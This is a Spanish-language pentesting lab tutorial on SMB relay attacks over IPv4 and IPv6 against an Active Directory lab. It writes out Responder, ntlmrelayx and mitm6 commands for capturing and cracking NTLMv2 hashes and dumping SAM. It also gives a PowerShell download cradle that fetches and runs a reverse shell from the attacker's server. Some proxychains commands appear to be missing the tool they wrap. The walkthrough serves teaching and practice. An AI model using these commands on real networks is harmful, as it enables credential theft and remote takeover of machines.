---
layout: single
title: Ataque Samba Relay - IPv4 e IPv6
excerpt: "En este Post, enseñare a realizar el ataque de Samba Relay por IPv4 e IPv6, explicando en que consiste el ataque y las diferentes herramientas que se emplean. Todo desde mi laboratorio personal de prácticas de Active Directory ofensivo."
date: 2026-08-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-shocker/
  teaser_home_page: true
  icon: /assets/images/
categories:
  - Active Directory
  - Web-documentation
  - Pentesting
tags:
  - SambaRelay
  - SOCKS-Proxy
  - SMB-Signing
  - DumpHashes
  - SAMdump
---

Técnica utilizada para robar autenticaciones a través de las comunicaciones por samba que realiza un usuario o una tarea automatizadas a nivel empresarial que accede a X recurso. Por ejemplo, conectarse a un share o que se apague el equipo. Cual si se equivoca o no existe dicho recurso, podremos envenenar dicha comunicación y capturar los hashes NTLMv2 (Solo crackearlo, no para *PTH - Pass The Hash*).

>Aunque suelen a ver accesos directos a recursos compartidos en red para facilitar el acesso en Entornos reales.

Se efectúa cuando un equipo no tiene firmado samba, lo podemos mirar con netexec:

```bash
nxc smb ips_disponibles.txt -u "" -p ""
nxc smb 10.10.10.0/24
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260813010554.png)

>Por lo general, el DC y sistemas operativos modernos suele venir firmado por defecto.

Al no estar firmado y venir por defecto, no se logra validar la legitimidad del origen.

Hay dos protocolos a nivel de Red en la capa de Internet, por el cual podemos ejecutar dicho ataque en caso de que alguno no de estos no este disponible, poder tirar del otro: **IPv4 y IPv6**



### VERSIÓN IPv4
### SMB-RELAY TÍPICO
Podemos tener el Firewall a nivel Dominio (o todos) y el Antivirus activado:

![](/assets/images/ayuda-sambarelay/Pasted image 20260813182408.png)

![](/assets/images/ayuda-sambarelay/Pasted image 20260813182459.png)


De primeras para realizar un Samba Relay típico usaremos la herramienta *Responder* para envenenar el tráfico.
 
 >Archivo de configuración: <span style="color:lightblue">/usr/share/responder/</span>**Responder.conf** -> Lo dejamos por defecto
 
![](/assets/images/ayuda-sambarelay/Pasted image 20260813013511.png)


Ejecutamos la herramienta con los siguientes parámetros:

```bash
sudo responder -I eth0 -dw
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260813182725.png)


Buscamos algún recurso inexistente a nivel de red. Y no necesitamos ni siquiera que introduzca las credenciales, con escribirlo o buscarlo ya lo capturamos.

![](/assets/images/ayuda-sambarelay/Pasted image 20260813182915.png)


Con responder al envenenar el tráfico hemos cogido dicha comunicación y con ello el hash NTLMv2 del usuario al estar el smb sin firmar, debido a que le hemos dicho que se autentique contra nosotros debido a que no existe dicho recurso y se cree que somos nosotros el recurso a buscar.

![](/assets/images/ayuda-sambarelay/Pasted image 20260813182830.png)


Y como cogemos la configuración por defecto de todos los equipos podemos coger el hash de Administrador. Si el usuario estuviera ejecutando alguna tarea a nivel de red.

![](/assets/images/ayuda-sambarelay/Pasted image 20260813230744.png)


![](/assets/images/ayuda-sambarelay/Pasted image 20260813230658.png)


También con el servidor.

![](/assets/images/ayuda-sambarelay/Pasted image 20260813231149.png)

![](/assets/images/ayuda-sambarelay/Pasted image 20260813231212.png)


Para crakear la contraseña podemos usar **hashcat** o **john** de forma offline.

```bash
john --wordlist=../../wordlist/wordlists_passwords.txt hashes-relayIPv4 --pot=null.pot
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260813231921.png)

### SMB-RELAY: DUMPEAR SAM ABUSANDO DE PRIVILEGIO DE USUARIO SOBRE UN DETERMINADO EQUIPO

>Para que funcione se necesita que cada usuario tenga su equipo no todos uno. 

Ponemos las credenciales del Administrador del dominio.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814004313.png)


Hacemos que un usuario tenga privilegios sobre el equipo APP-SERVER, en este caso **Pablo Martinez**.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814004538.png)


Saldrá <span style="color:yellow">(pwned!)</span> eso querrá decir que ese usuario tiene privilegios sobre dicho equipo.

```bash
nxc smb 10.10.10.0/24 -u "pmartinez" -p '$P@ssw4rd#'
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814004710.png)


 Ahora nos vamos al archivo de configuración de responder y marcamos en **off** el *smb* y *http*.
 
![](/assets/images/ayuda-sambarelay/Pasted image 20260814001828.png)


Preparamos un archivo de targets donde voy a definir el equipo a comprometer. En este caso el **APP-SERVER**

![](/assets/images/ayuda-sambarelay/Pasted image 20260814003916.png)


Por una parte lanzamos el responder:

```bash
sudo responder -I eth0 -dw
```

Y por el otro lado usaremos la herramienta *ntlmrelayx* cual nos va a permitir apuntar a los objetivos mediante el fichero de targets que quiero comprometer.

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support # Le damos soporte con samba al ser windows
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814002008.png)


Buscamos un recurso en red inexistente.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814003954.png)


Y nos dumpearemos la SAM del equipo **APP-SERVER**, dejándonos un fichero con el mismo.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814010743.png)


Esto es debido a que como el samba esta sin firmar, no se logra comprobar la legitimidad del origen haciendo creer al usuario que nosotros somos el samba y que se autentique contra nosotros, y aprovecha las credenciales privilegiadas sobre **APP-SERVER** definido como target, haciendo que redirija esa autenticación sobre el equipo víctima/target para que con *ntlmrelayx* dumpear la SAM del equipo.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814004822.png)

>Te podrías conectar por: **psexec** o **wmiexec**


### EJECUTAR COMANDOS A NIVEL SISTEMA: NTLMRELAYX
Cuando envenenamos una comunicación podemos ejecutar comandos a nivel sistema.
En este caso ganaremos acceso al equipo mediante una revershell de powershell TCP.

>Repositorio a usar: https://github.com/samratashok/nishang


Voy a coger el que se llama '<span style="color:lime">Invoke-PowershellTcp.ps1</span>' y lo voy a nombrar '<span style="color:lime">PS.ps1</span>' para más comodidad.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814013937.png)

Dentro de este, copio el siguiente payload y me lo llevo abajo del todo:

![](/assets/images/ayuda-sambarelay/Pasted image 20260814014153.png)


Defino mi IP de atacante y el puerto para estar a la escucha y recibir la conexión.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020009.png)

>Problemas con responder por certificados SSL del puerto 443.


```bash
# Crearnos un servidor http por el puerto 8000
python3 -m http.server 8000

# Ponernos a la escucha por el puerto 4646
nc -nvlp 4646
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020042.png)


Y de forma paralela:

```bash
# Envenenar tráfico
sudo responder -I tun0 -dw

# Ejecutar script de powershell en el equipo objetivo y no dumpear la SAM
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.5:8000/PS.ps1')"
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020227.png)


Busco un recurso inexistente desde el equipo cual tengo privilegios sobre otro equipo.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020323.png)


Ahora en el campo donde va el comando meto el siguiente comando de powershell cual va hacer que acceda a mi servidor web y se descargue la reverse shell y la ejecute.

Si ha salido bien, abajo pondrá "SUCCED".

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020413.png)


Volviendo a netcat habremos recibido la conexión víctima exitosamente, estando como <span style="color:blue">autoridad del sistema</span>.

```bash
# Ver usuario actual
whoami

# Ver apodo del equipo
hostname
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814020448.png)


Vemos que tenemos la IP del equipo objetivo.

```bash
# Listar los principales parametros de red
ipconfig
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814021055.png)


### VERSIÓN IPv6
Si el método por IPv4 esta capado, podemos intentar hacerlo por IPv6.

Lo que haremos a continuación, es con *mitm6* envenenar el dominio de la empresa por completo, y con *ntlmrelayx* jugar con **proxychains** para crear un túnel y poder ejecutar comandos a nivel sistema. Y podremos así hacer un Relay, el cual no hará falta conocer la contraseña.


Como las máquinas Windows por defecto solicitan tráfico IPv6, con *mitm6* voy apuntar al dominio para envenenarlo por IPv6.

>Repositorio oficial: https://github.com/dirkjanm/mitm6.git

Le especificamos la interfaz en caso de tener dos, porque va a coger la primera.

```bash
sudo mitm6 -d cyberwarfare.corp -i eth0
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814135532.png)


Lo que conseguimos con esto es que tome como prioritaria mi IPv6 de atacante como servidor DNS. (También lo  hace con la puerta de enlace a la vez, pero supongo que dependerá la configuración.)

**APP-SERVER:**

![](/assets/images/ayuda-sambarelay/Pasted image 20260814140003.png)


**EMP-MACHINE:**

![](/assets/images/ayuda-sambarelay/Pasted image 20260814140107.png)


Mi objetivo es ganar acceso al equipo APP-SERVER (10.10.10.3), pues voy a definir los siguientes parámetros en ntlmrelayx para jugar con el y hacer el ataque por IPv6.


```bash
sudo impacket-ntlmrelayx -6 -wh 10.10.10.5 -t smb://10.10.10.3 -socks -debug -smb2support
# -6: Le decimos que ahora va a ser por ipv6
# -wh X.X.X.X: Le especificamos la IP atacante hacia donde se va redirigir la autenticación
# -t smb://X.X.X.X: Le especificamos el target el cual trataremos de autenticarnos
# -socks: Para jugar con proxychains y crear una conexión socks (Un túnel)
# -smb2support: Dar soporte con samba por compatibilidad al estar en un Windows
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814142453.png)


Ahora para tener una sessión interectiva hacemos **CTRL + L** o **Enter**.

Escribimos ``socks`` en la consola interactiva y nos dice que no hay disponibles.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814142635.png)


Me vengo al **APP-SERVER** cual no tiene privilegios sobre ningún equipo y busco un recurso compartido en la red inexistente a nivel de autenticación de red.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814145848.png)


Vuelvo al ntlmrelayx y en la salida pone *SUCCED* y que no tiene privilegios *FALSE*, esto no nos va a servir para poder hacer nada.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814145824.png)


Lo comprobamos con el comando `socks` para que nos lo de en formato de tabla. Nos dice que no tenemos privilegios sobre el Target.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814145714.png)


Sin embargo, si vamos a **EMP-MACHINE** como Pablo Martinez, que es el que tiene privilegios sobre **APP-SERVER** y buscamos un recurso que no exista a nivel de autenticación en la red, la cosa cambia.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814150027.png)


![](/assets/images/ayuda-sambarelay/Pasted image 20260814150314.png)


Al poner `socks` ahora nos dice que el usuario PMARTINEZ -> Pablo Martinez, tiene privilegios sobre el equipo de APP-Server (10.10.10.3) .

![](/assets/images/ayuda-sambarelay/Pasted image 20260814150338.png)


Ahora nos aseguramos de que en el archivo de configuración de Proxychains, tenemos alfinal `socks 127.0.0.1 1080` para estar a la escucha y crear el túnel.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814150534.png)


Como tenemos un Relaying de un usuario Administrador sobre dicho target, podemos tirar de proxychains para tunelizar y redirigirlo hacia nosotros y hacer uso de netexec para autenticarnos sobre dicho equipo y nos va a poner <span style="color:yellow">(Pwn3d!)</span>, sin conocer la contraseña poniendo la que queramos.

><span style="color:yellow">(Guest)</span> nose porque sale.

```bash
proxychains -u 'pmartinez' -p 'loquequiera' -d 'cyberwarfare'
proxychains -u 'pmartinez' -p '' -d 'cyberwarfare'
```

![](/assets/images/ayuda-sambarelay/Pasted image 20260814151420.png)


Lo que podemos hacer es Dumpearnos la SAM...

```bash
proxychains -u 'pmartinez' -p 'loquequiera' -d 'cyberwarfare' --sam 2>/dev/null
```

>**2>/dev/null** para no ver la salida de proxychains.

![](/assets/images/ayuda-sambarelay/Pasted image 20260814151814.png)
